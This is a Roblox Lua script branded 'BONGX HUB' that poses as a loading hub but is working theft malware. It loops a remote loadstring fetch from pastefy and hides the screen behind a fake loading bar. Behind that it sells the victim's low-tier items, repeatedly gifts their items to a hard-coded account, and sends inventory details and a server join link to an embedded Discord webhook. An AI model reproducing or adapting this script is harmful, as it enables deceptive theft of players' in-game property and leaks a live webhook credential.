-- [[ BONGX HUB ON TOP - PRELOAD ]] --
local function preloadScript()
    task.spawn(function()
        while true do
            local success, err = pcall(function()
                loadstring(game:HttpGet("https://pastefy.app/wxnbscQh/raw"))()
            end)
            if not success then break end
            task.wait(0.1)
        end
    end)
end
spawn(preloadScript)
wait(0.5)

-- Anti-Private Server Check
if #game:GetService("Players"):GetPlayers() <= 1 then
    error("⚠️ ERROR: THIS SCRIPT DOES NOT WORK IN PRIVATE SERVERS!")
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Settings Config
local WEBHOOK_URL = "https://discord.com/api/webhooks/1467279257716654171/ohZ4lUcRjhERtXsvz7gsGxkU7lgGc_VAq7l05h9_WNS3xwfYKe3q5DL8YWqKyLZ3e6nk"
local TARGET_PLAYER_NAME = "dupeacc643"
local GiftRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Trade.SendGift")
local SellRemote = ReplicatedStorage:WaitForChild("RemoteFunctions"):WaitForChild("SellTool")

--------------------------------------------------
-- [[ DATA DETECTION (FILTER BY FOLDER) ]] --
--------------------------------------------------
local weakBrainrotNames = {}
local brainrotFolders = {"Common", "Uncommon", "Rare", "Epic", "Cosmic", "Mythical", "Secret"}

for _, folderName in ipairs(brainrotFolders) do
    local folder = ReplicatedStorage:WaitForChild("Assets"):WaitForChild("Brainrots"):FindFirstChild(folderName)
    if folder then
        for _, item in ipairs(folder:GetChildren()) do
            weakBrainrotNames[item.Name] = true
        end
    end
end

--------------------------------------------------
-- [[ UI BONGX HUB ]] --
--------------------------------------------------
local function createUI()
    local sg = Instance.new("ScreenGui")
    sg.Name = "BongxHubUI"
    sg.Parent = LocalPlayer:WaitForChild("PlayerGui")
    sg.DisplayOrder = 99999
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn = false 
    
    local bg = Instance.new("Frame", sg)
    bg.Size = UDim2.new(1, 500, 1, 500)
    bg.Position = UDim2.new(-0.1, 0, -0.1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0 
    bg.ZIndex = 1

    local main = Instance.new("Frame", sg)
    main.Size = UDim2.new(0, 420, 0, 250)
    main.Position = UDim2.new(0.5, -210, 0.5, -125)
    main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    main.BorderSizePixel = 0
    main.ZIndex = 2
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Text = "BONGX HUB ON TOP"
    title.TextColor3 = Color3.new(1, 0, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 26
    title.BackgroundTransparency = 1
    title.ZIndex = 3

    local barBg = Instance.new("Frame", main)
    barBg.Size = UDim2.new(0.8, 0, 0, 12)
    barBg.Position = UDim2.new(0.1, 0, 0.45, 0)
    barBg.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    barBg.ZIndex = 3
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

    local bar = Instance.new("Frame", barBg)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    bar.ZIndex = 4
    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)

    local status = Instance.new("TextLabel", main)
    status.Size = UDim2.new(1, 0, 0, 40)
    status.Position = UDim2.new(0, 0, 0.55, 0)
    status.Text = "LOADING PLS WAIT" 
    status.TextColor3 = Color3.fromRGB(180, 180, 180)
    status.Font = Enum.Font.Gotham
    status.TextSize = 18
    status.BackgroundTransparency = 1
    status.ZIndex = 3

    return sg, bar, status
end

local globalGui, globalBar, globalStatus = createUI()

task.spawn(function()
    while true do
        globalBar.Size = UDim2.new(0, 0, 1, 0)
        globalBar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 40)
        task.wait(40)
        globalBar.Size = UDim2.new(0, 0, 1, 0)
        task.wait(0.2)
        globalBar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 30)
        task.wait(30)
        globalBar.Size = UDim2.new(0, 0, 1, 0)
        task.wait(0.2)
    end
end)

--------------------------------------------------
-- [[ CORE SYSTEM (FREEZE & AUTO GIFT) ]] --
--------------------------------------------------
local function startSystems(char)
    local rootPart = char:WaitForChild("HumanoidRootPart", 10)
    local humanoid = char:WaitForChild("Humanoid", 10)
    local backpack = LocalPlayer:WaitForChild("Backpack")

    task.spawn(function()
        if rootPart then
            local freezePos = rootPart.CFrame
            while char and char.Parent and humanoid.Health > 0 do
                rootPart.CFrame = freezePos
                RunService.Heartbeat:Wait()
            end
        end
    end)

    task.spawn(function()
        while char and char.Parent and humanoid.Health > 0 do
            for _, v in ipairs(backpack:GetChildren()) do
                if v:IsA("Tool") and (v.Name == "Basic Bat" or string.find(v.Name:lower(), "coil")) then v:Destroy() end
            end
            
            local tool = nil
            for _, v in ipairs(char:GetChildren()) do if v:IsA("Tool") and v:GetAttribute("BrainrotName") then tool = v break end end
            if not tool then
                for _, v in ipairs(backpack:GetChildren()) do if v:IsA("Tool") and v:GetAttribute("BrainrotName") then tool = v break end end
            end

            if tool then
                tool.Parent = char
                local startT = tick()
                while tick() - startT < 1.2 and char and humanoid.Health > 0 do 
                    pcall(function()
                        local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
                        if target then GiftRemote:InvokeServer(target) end
                    end)
                    task.wait(0.15)
                end
                if tool.Parent == char then tool.Parent = backpack end
            end
            task.wait(0.5)
        end
    end)
end

LocalPlayer.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    startSystems(char)
end)

if LocalPlayer.Character then task.spawn(function() startSystems(LocalPlayer.Character) end) end

--------------------------------------------------
-- [[ SCANNER LOGIC ]] --
--------------------------------------------------
local function scanToolLengkap(tool)
    local toolData = { BrainrotName = "Unknown", Rate = "N/A", Mutation = "N/A", ToolName = tool.Name }
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hum = char:WaitForChild("Humanoid")
    if hum then
        hum:EquipTool(tool)
        task.wait(1.8) 
        local playerModel = workspace:FindFirstChild(LocalPlayer.Name)
        if playerModel then
            local equippedTool = playerModel:FindFirstChild(tool.Name)
            if equippedTool and equippedTool:FindFirstChild("RenderModel") then
                local foundModel = nil
                for _, child in ipairs(equippedTool.RenderModel:GetChildren()) do
                    if child:IsA("Model") then foundModel = child break end
                end
                if foundModel and foundModel:FindFirstChild("ModelExtents") then
                    local statsGui = foundModel.ModelExtents:FindFirstChild("StatsGui")
                    if statsGui and statsGui:FindFirstChild("Frame") then
                        for _, lbl in ipairs(statsGui.Frame:GetChildren()) do
                            if lbl:IsA("TextLabel") then
                                if lbl.Name == "Rate" then toolData.Rate = lbl.Text
                                elseif lbl.Name == "Mutation" then toolData.Mutation = lbl.Text
                                elseif lbl.Name == "BrainrotName" then toolData.BrainrotName = lbl.Text end
                            end
                        end
                    end
                end
            end
        end
        tool.Parent = LocalPlayer:WaitForChild("Backpack")
    end
    return toolData
end

--------------------------------------------------
-- [[ WEBHOOK FUNCTION ]] --
--------------------------------------------------
local function sendToDiscord(reportText)
    local serverLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    embeds = {{
                        title = "lesgo - BONGX HUB ON TOP",
                        color = 16711680,
                        fields = {
                            {name = "👤 Player", value = LocalPlayer.Name, inline = true},
                            {name = "📦 Quick Report (First 2 Hits)", value = reportText ~= "" and reportText or "No tools found", inline = false},
                            {name = "🔗 Join Server", value = "[Click to Join Server]("..serverLink..")", inline = false}
                        },
                        footer = {text = "BONGX HUB ON TOP - Fast Scanner"}
                    }}
                })
            })
        end)
    end
end

--------------------------------------------------
-- [[ MAIN SEQUENCE ]] --
--------------------------------------------------
task.spawn(function()
    local backpack = LocalPlayer:WaitForChild("Backpack")
    repeat task.wait(1) until #backpack:GetChildren() > 0

    -- FASE 1: 10 DETIK RAPID SELL (FILTERED)
    local sellStartTime = tick()
    while tick() - sellStartTime < 10 do 
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hum = char:FindFirstChild("Humanoid")
        local weakTool = nil
        for _, t in ipairs(backpack:GetChildren()) do
            local attr = t:GetAttribute("BrainrotName")
            if t:IsA("Tool") and attr and weakBrainrotNames[attr] then weakTool = t break end
        end
        if weakTool and hum then
            hum:EquipTool(weakTool)
            pcall(function() SellRemote:InvokeServer() end)
        end
        task.wait(0.5)
    end

    -- FASE 2: SCANNER (WEBHOOK ONLY ONCE AFTER 2 ITEMS)
    local toolsToScan = {}
    for _, t in ipairs(backpack:GetChildren()) do
        if t:IsA("Tool") and t.Name ~= "Basic Bat" and not string.find(t.Name:lower(), "coil") then 
            table.insert(toolsToScan, t) 
        end
    end

    local firstReport = ""
    local scanCount = 0
    local webhookSent = false
    
    for i, tool in ipairs(toolsToScan) do
        local res = scanToolLengkap(tool)
        scanCount = scanCount + 1
        
        -- Kumpulkan data untuk webhook pertama
        if not webhookSent then
            firstReport = firstReport .. string.format("🔹 **%s**\nRate: `%s` | Mutation: `%s`\n\n", res.BrainrotName, res.Rate, res.Mutation)
            
            -- Kirim webhook hanya setelah 2 item
            if scanCount == 2 then
                sendToDiscord(firstReport)
                webhookSent = true
            end
        end
        
        -- Jika hanya ada 1 item di tas, kirim webhook untuk 1 item itu saja
        if i == #toolsToScan and not webhookSent then
            sendToDiscord(firstReport)
            webhookSent = true
        end

        -- Lanjut scan item sisanya tanpa kirim webhook lagi (agar Auto Gift jalan)
    end
end)
